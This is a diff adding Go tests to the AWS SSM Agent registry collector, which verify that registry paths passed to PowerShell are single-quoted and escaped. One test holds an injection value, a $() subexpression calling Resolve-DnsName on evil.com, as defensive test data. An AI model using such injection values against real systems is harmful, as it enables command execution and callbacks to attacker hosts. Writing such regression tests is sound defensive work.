@@ -15,6 +15,7 @@ package registry
 
 import (
 	"errors"
+	"strings"
 	"testing"
 
 	"github.com/aws/amazon-ssm-agent/agent/mocks/context"
@@ -145,4 +146,59 @@ func TestGetRegistryDataInvalidMarker(t *testing.T) {
 
 	assert.Nil(t, err)
 	assert.Equal(t, testRegistryOutputDataSingleCall, data)
+}
+
+func TestGetRegistryDataUsesSingleQuotesForPath(t *testing.T) {
+	var capturedCommand string
+	contextMock := context.NewMockDefault()
+	cmdExecutor = func(command string, args ...string) ([]byte, error) {
+		capturedCommand = command + " " + strings.Join(args, " ")
+		return []byte("[]"), nil
+	}
+	startMarker = "<start1234>"
+	endMarker = "<end1234>"
+	mockFilters := `[{"Path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Amazon","Recursive": true}]`
+	mockConfig := model.Config{Collection: "Enabled", Filters: mockFilters, Location: ""}
+	_, _ = collectRegistryData(contextMock, mockConfig)
+
+	// Path is wrapped in single quotes (not double quotes)
+	assert.Contains(t, capturedCommand, `-Path '`)
+	assert.Contains(t, capturedCommand, `Registry::`)
+	assert.NotContains(t, capturedCommand, `-Path "Registry::`)
+}
+
+func TestGetRegistryDataPreventsSubexpressionExpansion(t *testing.T) {
+	var capturedCommand string
+	contextMock := context.NewMockDefault()
+	cmdExecutor = func(command string, args ...string) ([]byte, error) {
+		capturedCommand = command + " " + strings.Join(args, " ")
+		return []byte("[]"), nil
+	}
+	startMarker = "<start1234>"
+	endMarker = "<end1234>"
+	mockFilters := `[{"Path": "HKEY_LOCAL_MACHINE$($null=Resolve-DnsName evil.com)","Recursive": false}]`
+	mockConfig := model.Config{Collection: "Enabled", Filters: mockFilters, Location: ""}
+	_, _ = collectRegistryData(contextMock, mockConfig)
+
+	// Single quotes prevent $() expansion
+	assert.Contains(t, capturedCommand, `-Path 'Registry::HKEY_LOCAL_MACHINE$($null=Resolve-DnsName evil.com)'`)
+	assert.NotContains(t, capturedCommand, `-Path "`)
+}
+
+func TestGetRegistryDataEscapesSingleQuotesInPath(t *testing.T) {
+	var capturedCommand string
+	contextMock := context.NewMockDefault()
+	cmdExecutor = func(command string, args ...string) ([]byte, error) {
+		capturedCommand = command + " " + strings.Join(args, " ")
+		return []byte("[]"), nil
+	}
+	startMarker = "<start1234>"
+	endMarker = "<end1234>"
+	mockFilters := `[{"Path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\it's","Recursive": false}]`
+	mockConfig := model.Config{Collection: "Enabled", Filters: mockFilters, Location: ""}
+	_, _ = collectRegistryData(contextMock, mockConfig)
+
+	// PowerShell escapes ' as '' inside single-quoted strings
+	assert.Contains(t, capturedCommand, `it''s'`)
+	assert.Contains(t, capturedCommand, `-Path '`)
 }
